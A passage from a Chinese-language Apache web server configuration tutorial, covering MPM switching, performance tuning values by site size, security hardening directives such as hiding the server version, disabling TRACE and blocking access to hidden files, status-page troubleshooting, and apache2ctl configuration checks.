<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁用当前MPM</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2dismod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm_prefork</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用新的MPM</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm_event</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启Apache</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<hr/>
<h3 id="8-性能调优参数总结">8. 性能调优参数总结<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#8-性能调优参数总结" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h3 id="81-全局性能参数apache2conf">8.1 全局性能参数（apache2.conf）<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#81-全局性能参数apache2conf" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 连接管理 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 请求超时时间（秒）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Timeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 300</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用持久连接</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAlive</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 持久连接的最大请求数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxKeepAliveRequests</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 100</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 持久连接超时时间（秒）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 建议设置为2-5秒以提高并发能力</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAliveTimeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 5</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 请求限制 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 限制请求体大小（字节）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestBody</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10485760</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        # 10MB</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 限制请求头字段数量</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestFields</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 100</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 限制请求头字段大小（字节）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestFieldSize</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8190</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 限制请求行大小（字节）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestLine</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8190</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 主机名查找 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁用DNS反向查找（提高性能）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">HostnameLookups</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> Off</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 文件系统访问 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁用符号链接所有权匹配检查（提高性能）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Options +FollowSymLinks</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用文件系统缓存</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">EnableMMAP</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">EnableSendfile</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span></code></pre></figure>
<h5 id="82-服务器资源配置建议">8.2 服务器资源配置建议<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#82-服务器资源配置建议" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<p><strong>小型网站（共享主机级别）：</strong></p>
<ul>
<li>内存：1-2GB</li>
<li>预期并发：20-50</li>
</ul>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        50</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAliveTimeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">         2</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   3000</span></span></code></pre></figure>
<p><strong>中型网站（VPS/小型服务器）：</strong></p>
<ul>
<li>内存：4-8GB</li>
<li>预期并发：100-200</li>
</ul>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        150</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAliveTimeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">         3</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   5000</span></span></code></pre></figure>
<p><strong>大型网站（专用服务器）：</strong></p>
<ul>
<li>内存：16GB+</li>
<li>预期并发：500+</li>
</ul>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        400</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAliveTimeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">         5</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   10000</span></span></code></pre></figure>
<hr/>
<h3 id="9-安全配置参数详解">9. 安全配置参数详解<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#9-安全配置参数详解" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<h5 id="91-服务器标识apache2conf或securityconf">9.1 服务器标识（apache2.conf或security.conf）<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#91-服务器标识apache2conf或securityconf" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 服务器标识信息控制</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Prod - 仅显示 &quot;Apache&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Major - 显示 &quot;Apache/2&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Minor - 显示 &quot;Apache/2.4&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Min - 显示 &quot;Apache/2.4.X&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># OS - 显示 &quot;Apache/2.4.X (Debian)&quot;</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Full - 显示完整信息（默认，不安全）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ServerTokens</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Prod</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 关闭错误页面中的服务器签名</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ServerSignature</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> Off</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁用TRACE方法（防止XST攻击）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">TraceEnable</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> Off</span></span></code></pre></figure>
<h5 id="92-访问控制最佳实践">9.2 访问控制最佳实践<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#92-访问控制最佳实践" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 默认拒绝策略</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> None</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> None</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 仅开放需要的目录</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> -Indexes +FollowSymLinks</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> FileInfo AuthConfig</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 保护敏感文件</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;^\.ht|\.git|\.svn|\.env|composer\.(json|lock)|package\.json&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 限制HTTP方法</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">LimitExcept</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> GET POST HEAD</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">LimitExcept</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 防止目录遍历</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">DirectoryMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;^/.*/\.&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">DirectoryMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<hr/>
<h3 id="10-故障排查配置参数">10. 故障排查配置参数<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#10-故障排查配置参数" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 调试日志级别 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 生产环境</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogLevel</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> warn</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 开发/调试环境</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogLevel</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> info ssl:warn rewrite:trace3</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 详细调试（会产生大量日志）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogLevel</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> debug</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 核心转储（崩溃调试）======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在envvars中启用</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ulimit -c unlimited</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># CoreDumpDirectory /tmp</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 扩展状态 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_status.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /server-status</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SetHandler</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> server-status</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> local</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # Require ip 192.168.1.0/24</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 启用扩展状态信息</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ExtendedStatus</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 服务器信息 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_info.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /server-info</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SetHandler</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> server-info</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> local</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Location</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>访问服务器状态：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 文本格式</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost/server-status</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 自动刷新格式</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost/server-status?auto</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在浏览器中访问</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">http://localhost/server-status</span></span></code></pre></figure>
<hr/>
<h3 id="11-配置文件验证与测试">11. 配置文件验证与测试<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#11-配置文件验证与测试" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 语法检查 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试配置文件语法</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> configtest</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 显示解析后的配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -S</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 配置转储 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 转储虚拟主机配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DUMP_VHOSTS</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 转储运行时配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DUMP_RUN_CFG</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 转储包含的文件</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DUMP_INCLUDES</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 转储加载的模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -M</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 配置信息 ======</span></span>
<span data-line> </span>
